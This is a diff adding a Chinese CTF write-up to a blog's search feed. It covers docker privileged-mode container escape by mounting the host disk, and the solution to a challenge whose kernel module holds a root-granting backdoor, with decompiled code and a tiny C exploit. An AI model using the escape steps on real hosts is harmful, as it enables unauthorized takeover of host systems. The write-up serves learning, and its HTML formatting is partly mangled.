@@ -5,7 +5,130 @@
     <entry>
       <title><![CDATA[play_with_docker]]></title>
       <url>/2019/10/31/play-with-docker/</url>
-      <content type="html"></content>
+      <content type="html"><![CDATA[<blockquote>
+<p>数字云是第一次线下打real world模式,题目质量很高,深感自己所学知识的匮乏,因此特地学习了一波docker相关的知识</p>
+</blockquote>
+<h1 id="docker在特权模式下启动的逃逸"><a href="#docker在特权模式下启动的逃逸" class="headerlink" title="docker在特权模式下启动的逃逸"></a>docker在特权模式下启动的逃逸</h1><h2 id="开启–privileged-的情况下-或者使用—cap-add-SYSADMIN参数启动时"><a href="#开启–privileged-的情况下-或者使用—cap-add-SYSADMIN参数启动时" class="headerlink" title="开启–privileged 的情况下(或者使用—cap-add=SYSADMIN参数启动时)"></a>开启–privileged 的情况下(或者使用—cap-add=SYSADMIN参数启动时)</h2><p>我们知道在版本6.0以后docker引入了特权模式</p>
+<p>特权模式下允许容器内的root几乎拥有外部物理机的root级别权限，而在此之前容器内root用户仅拥有外部物理机普通用户权限。</p>
+<p>因此,在开启了privileged的时候,我们就可以通过mount命令将外部宿主的磁盘挂载在容器内部,此时也就获得了宿主机的读写权限</p>
+<p>比如我们以特权模式开启一个docker,此时利用<figure class="highlight plain"><figcaption><span>-l```命令来查看磁盘文件:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">root@ed1221982ba0:~# fdisk -l</span><br><span class="line">Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel type: dos</span><br><span class="line">Disk identifier: 0x6e32e1c3</span><br><span class="line"></span><br><span class="line">Device     Boot Start      End  Sectors Size Id Type</span><br><span class="line">/dev/sda1  *     2048 41940991 41938944  20G 83 Linux</span><br></pre></td></tr></table></figure></p>
+<p>此时我们就可以把sda1挂载到我们的容器内</p>
+<ol>
+<li>mkdir /xyz</li>
+<li>mount /dev/sda1 /xyz</li>
+</ol>
+<p>此时我们访问/xyz就可以访问到宿主机了,并且是拥有读写权限的,执行命令我们也可以通过写入<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 数字云线下docker解法</span><br><span class="line"></span><br><span class="line">线下的时候里一血和做不出来差了一个字符,导致这篇文章咕咕咕了很久</span><br><span class="line"></span><br><span class="line">题目要求是ssh上宿主机起的docker,然后在宿主机弹出计算器即可,给了宿主机启动docker前的的两行命令</span><br></pre></td></tr></table></figure></p>
+<p>sudo insmod /home/b/de.ko<br>sudo docker run -itd –privileged -p 0.0.0.0:23:22 d77241e92fe6 /bin/bash -c “/etc/init.d/ssh start;/bin/bash”</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">一种取巧的做法就是上面描述的使用特权方法,也是我线下时采用的(当时成功了,但是环境崩了一度让我以为是我没做对</span><br><span class="line"></span><br><span class="line">这里就使用这道题的正规解法来做吧</span><br><span class="line"></span><br><span class="line">题目首先挂载了de.ko文件,然后启动了docker,那么肯定是ko文件的问题,我们拉进IDA中对文件进行分析</span><br><span class="line"></span><br><span class="line">## init_moudle</span><br></pre></td></tr></table></figure>
+<p><strong>int64 init_module()<br>{
+  </strong>int64 v0; // rdi<br>  __int64 v1; // rax</p>
+<p>  _fentry__();<br>  v0 = kmalloc_caches[4];<br>  <em>(&amp;note + 0x100000000LL) = 0;<br>  v1 = kmem_cache_alloc_trace(v0, 20971712LL, 10LL);
+  </em>(_BYTE *)(v1 + 8) = 1;<br>  hack = v1;<br>  proc_create_data(“de”, 438LL, 0LL, &amp;de_proc, 0LL);<br>  printk(“/proc/de created\n”, 438LL);<br>  printk(“size of cred : %ld \n”, 168LL);<br>  return 0LL;<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## copy_overflow</span><br></pre></td></tr></table></figure></p>
+<p>void <strong>fastcall </strong>noreturn copy_overflow(unsigned int a1, __int64 a2)<br>{<br>  _warn_printk(“Buffer overflow detected (%d &lt; %lu)!\n”, a1, a2);<br>  BUG();<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## de_write</span><br></pre></td></tr></table></figure></p>
+<p><strong>int64 </strong>usercall de_write@<rax>(<strong>int64 a1@<rbx>, </rbx></strong>int64 a2@<rbp>, char <em>a3@<rsi>, <strong>int64 a4@<r12>, </r12></strong>int64 a5@<r13>, __int64 a6@<r14>)<br>{<br>  char </r14></r13></rsi></em>v6; // rbx<br>  <strong>int64 v7; // rdx
+  </strong>int64 v8; // r12<br>  <strong>int64 v9; // rsi<br>  char v10; // al
+  </strong>int64 v11; // rax<br>  <strong>int64 v12; // rsi
+  </strong>int64 v14; // rax<br>  unsigned int v15; // eax<br>  <strong>int64 v16; // r13
+  </strong>int64 v17; // r13<br>  const char *v18; // [rsp-40h] [rbp-40h]<br>  <strong>int64 v19; // [rsp-38h] [rbp-38h]<br>  unsigned </strong>int64 v20; // [rsp-30h] [rbp-30h]<br>  <strong>int64 v21; // [rsp-28h] [rbp-28h]
+  </strong>int64 v22; // [rsp-20h] [rbp-20h]<br>  <strong>int64 v23; // [rsp-18h] [rbp-18h]
+  </strong>int64 v24; // [rsp-10h] [rbp-10h]<br>  __int64 v25; // [rsp-8h] [rbp-8h]</rbp></rax></p>
+<p>  _fentry__();<br>  v25 = a2;<br>  v24 = a6;<br>  v23 = a5;<br>  v22 = a4;<br>  v21 = a1;<br>  v6 = a3;<br>  v8 = v7;<br>  v20 = <strong>readgsqword(0x28u);<br>  mutex_lock(&amp;lock);<br>  v9 = (unsigned </strong>int8)<em>a3;<br>  printk(“order:%d”, v9);<br>  v10 = </em>v6;<br>  if ( <em>v6 )<br>  {<br>    if ( v10 == -1 )<br>    {<br>      printk(“note write\n”, v9);<br>      v17 = </em>((_QWORD <em>)&amp;note + 1);<br>      _check_object_size(</em>((_QWORD <em>)&amp;note + 1), v8 - 1, 0LL);<br>      copy_from_user(v17, v6 + 1, v8 - 1);<br>      printk(“write contents compelete\n”, v6 + 1);<br>    }<br>    else if ( v10 == -2 )<br>    {<br>      printk(“note write magic %ld\n”, v8);<br>      v16 = hack;<br>      _check_object_size(hack, v8 - 1, 0LL);<br>      copy_from_user(v16, v6 + 1, v8 - 1);<br>    }<br>    else if ( v10 != -3 || </em>(_BYTE <em>)(hack + 8) )<br>    {<br>      printk(“note malloc\n”, v9);<br>      note = </em>v6;<br>      printk(“write size compelete\n”, v9);<br>      v11 = _kmalloc((unsigned <strong>int8)note, 20971712LL);<br>      v12 = (unsigned </strong>int8)note;<br>      <em>((_QWORD </em>)&amp;note + 1) = v11;<br>      printk(“malloc size compelete:%d @ %p\n”, v12);<br>    }<br>    else<br>    {<br>      v14 = prepare_kernel_cred(0LL);<br>      commit_creds(v14);<br>      v18 = “/usr/bin/gnome-calculator”;<br>      v19 = 0LL;<br>      v15 = call_usermodehelper(“/usr/bin/gnome-calculator”, &amp;v18, envp_26376, 1LL);<br>      printk(“RC is: %i \n”, v15);<br>    }<br>  }<br>  else<br>  {<br>    printk(“note free\n”, v9);<br>    kfree(<em>((_QWORD </em>)&amp;note + 1));<br>  }<br>  mutex_unlock(&amp;lock);<br>  return v8;<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## de_read</span><br></pre></td></tr></table></figure></p>
+<p>unsigned <strong>int64 </strong>fastcall de_read(<strong>int64 a1, </strong>int64 a2)<br>{<br>  unsigned <strong>int64 v2; // rdx<br>  unsigned </strong>int64 v3; // r12<br>  unsigned <strong>int64 v4; // rbx
+  </strong>int64 v5; // r12</p>
+<p>  _fentry__();<br>  v3 = v2;<br>  mutex_lock(&amp;lock);<br>  printk(“/proc/de read\n”, a2);<br>  v4 = (unsigned <strong>int8)note;<br>  if ( (unsigned </strong>int8)note &gt; v3 )<br>    v4 = v3;<br>  v5 = <em>((_QWORD </em>)&amp;note + 1);<br>  _check_object_size(<em>((_QWORD </em>)&amp;note + 1), v4, 1LL);<br>  copy_to_user(a2, v5, v4);<br>  mutex_unlock(&amp;lock);<br>  return v4;<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">我们可以看到我们只需要紧盯de_write函数即可,我们只需要让程序跳转到这里就可以调用后门来弹出计算器了</span><br></pre></td></tr></table></figure></p>
+<p>v14 = prepare_kernel_cred(0LL);<br>commit_creds(v14);<br>v18 = “/usr/bin/gnome-calculator”;<br>v19 = 0LL;<br>v15 = call_usermodehelper(“/usr/bin/gnome-calculator”, &amp;v18, envp_26376, 1LL);<br>printk(“RC is: %i \n”, v15);<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们知道在内核中想要获得root权限不能只是用system(&quot;/bin/sh&quot;);而是用下面的语句：</span><br><span class="line">```commit_creds(prepare_kernel_cred (0));</span><br></pre></td></tr></table></figure></p>
+<p>这个函数分配并应用了一个新的凭证结构（uid = 0, gid = 0）从而获取root权限来执行命令</p>
+<p>那么我们该如何跳转到这里呢?<br>我们可以看到de_write的定义如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_int64 __usercall de_write@&lt;rax&gt;(__int64 a1@&lt;rbx&gt;, __int64 a2@&lt;rbp&gt;, char *a3@&lt;rsi&gt;, __int64 a4@&lt;r12&gt;, __int64 a5@&lt;r13&gt;, __int64 a6@&lt;r14&gt;)</span><br></pre></td></tr></table></figure></p>
+<p>而正常情况下write函数的定义为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssize_t write(int filedes, void *buf, size_t nbytes);</span><br></pre></td></tr></table></figure></p>
+<p>因此我们不难猜到a3应该就是我们所传入的buf<br>而我们所关注的只有v6,也就是a3<br>后面做了一个赋值操作,即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先传入所写值v6,如果v6有值就进行下面的判断,首先如果v10==-1,那么</span><br></pre></td></tr></table></figure></p>
+<pre><code>printk(&quot;note write\n&quot;, v9);
+v17 = *((_QWORD *)&amp;note + 1);
+_check_object_size(*((_QWORD *)&amp;note + 1), v8 - 1, 0LL);
+copy_from_user(v17, v6 + 1, v8 - 1);
+printk(&quot;write contents compelete\n&quot;, v6 + 1);
+</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">而如果是-2,那么</span><br></pre></td></tr></table></figure>
+<pre><code>printk(&quot;note write magic %ld\n&quot;, v8);
+v16 = hack;
+_check_object_size(hack, v8 - 1, 0LL);
+copy_from_user(v16, v6 + 1, v8 - 1);
+</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果```v10 != -3 || *(_BYTE *)(hack + 8) ```就运行</span><br></pre></td></tr></table></figure>
+<pre><code>printk(&quot;note malloc\n&quot;, v9);
+note = *v6;
+printk(&quot;write size compelete\n&quot;, v9);
+v11 = _kmalloc((unsigned __int8)note, 20971712LL);
+v12 = (unsigned __int8)note;
+*((_QWORD *)&amp;note + 1) = v11;
+printk(&quot;malloc size compelete:%d @ %p\n&quot;, v12);
+</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">否则才能跳转到我们所需要的逻辑上,而这个hack变量在bss段上,因此我们需要让v10=-1并且```*(_BYTE *)(hack+8)```值为0,迷惑行为2333</span><br><span class="line"></span><br><span class="line">其实这里我们直接看汇编部分会更加清楚</span><br></pre></td></tr></table></figure>
+<p>text:0000000000000020                 call    <strong>fentry</strong><br>.text:0000000000000025                 push    rbp<br>.text:0000000000000026                 mov     rdi, offset lock<br>.text:000000000000002D                 mov     rbp, rsp<br>.text:0000000000000030                 push    r14<br>.text:0000000000000032                 push    r13<br>.text:0000000000000034                 push    r12<br>.text:0000000000000036                 push    rbx<br>.text:0000000000000037                 mov     rbx, rsi<br>.text:000000000000003A                 mov     r12, rdx<br>.text:000000000000003D                 sub     rsp, 18h<br>.text:0000000000000041                 mov     rax, gs:28h<br>.text:000000000000004A                 mov     [rbp-28h], rax<br>.text:000000000000004E                 xor     eax, eax<br>.text:0000000000000050                 call    mutex_lock<br>.text:0000000000000055                 movzx   esi, byte ptr [rbx]<br>.text:0000000000000058                 mov     rdi, offset aOrderD ; “order:%d”<br>.text:000000000000005F                 call    printk<br>.text:0000000000000064                 movzx   eax, byte ptr [rbx]<br>.text:0000000000000067                 test    al, al<br>.text:0000000000000069                 jz      loc_1D6<br>.text:000000000000006F                 cmp     al, 0FFh<br>.text:0000000000000071                 jz      loc_191<br>.text:0000000000000077                 cmp     al, 0FEh<br>.text:0000000000000079                 jz      loc_155<br>.text:000000000000007F                 cmp     al, 0FDh<br>.text:0000000000000081                 jnz     short loc_90<br>.text:0000000000000083                 mov     rax, cs:hack<br>.text:000000000000008A                 cmp     byte ptr [rax+8], 0<br>.text:000000000000008E                 jz      short loc_10E<br>.text:0000000000000090<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">只需要调用write函数写入```\xfd```即可(我可真是个菜鸡</span><br><span class="line"></span><br><span class="line">exp如下:</span><br></pre></td></tr></table></figure></p>
+<p>#include &lt;stdio.h&gt;</p>
+<p>void main(){<br>   int fd = open(“/proc/de”, 2);<br>   write(fd, “\xfd”, 1);<br>    }</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">编译运行即可弹出计算器</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这里记录一个脚本可以实时查看内核的输出:</span><br></pre></td></tr></table></figure>
+<p>#include &lt;stdio.h&gt;</p>
+<p>#include &lt;stdlib.h&gt;</p>
+<p>int compareFile(FILE <em>old, FILE </em>new);</p>
+<p>int main()<br>{<br>    FILE <em>new;<br>    FILE </em>old;<br>    int lRet;<br>    static first = 0;</p>
+<pre><code>system(&quot;touch file_new&quot;);
+system(&quot;touch file_old&quot;);
+
+new = fopen(&quot;file_new&quot;, &quot;rw&quot;);
+old = fopen(&quot;file_old&quot;, &quot;rw&quot;);
+
+while(1)
+{   
+    sleep(1);
+    system(&quot;dmesg &gt; file_new&quot;);
+
+    if (first == 0)
+    {   
+        system(&quot;cp file_new file_old&quot;);
+        first++;
+        continue;
+    }   
+
+    new = fopen(&quot;file_new&quot;, &quot;rw&quot;);
+    old = fopen(&quot;file_old&quot;, &quot;rw&quot;);
+
+    if (compareFile(new, old) == 0)
+    {   
+        fclose(new);
+        fclose(old);
+        continue;
+    }   
+    else
+    {   
+        fclose(new);
+        fclose(old);
+
+        system(&quot;diff file_new file_old&quot;);
+        system(&quot;cp file_new file_old&quot;);
+    }  
+}
+return 0;
+</code></pre><p>}</p>
+<p>int compareFile(FILE <em>old, FILE </em>new)<br>{<br>    char c1;<br>    char c2;</p>
+<pre><code>while(!feof(old) &amp;&amp; !feof(new))
+{
+    c1 = fgetc(old);
+    c2 = fgetc(new);
+
+    if (c1 != c2)
+    {
+        return -1;
+    }
+}
+
+if ((c1 == EOF)&amp;&amp;(c2 == EOF))
+{
+    return 0;
+}
+return -1;
+</code></pre><p>}</p>
+<p><code>`</code><br>编译运行并跑起来即可</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>遇到之前没遇到的东西一定不能能慌,说不定非常简单(我真是个菜鸡hhh</p>
+<p>F5大法得到的东西诡异不如直接阅读反汇编代码</p>
+<p>不过也学到了如何与linux后门进行交互,感谢出题人的良苦用心</p>
+]]></content>
       
         
     </entry>
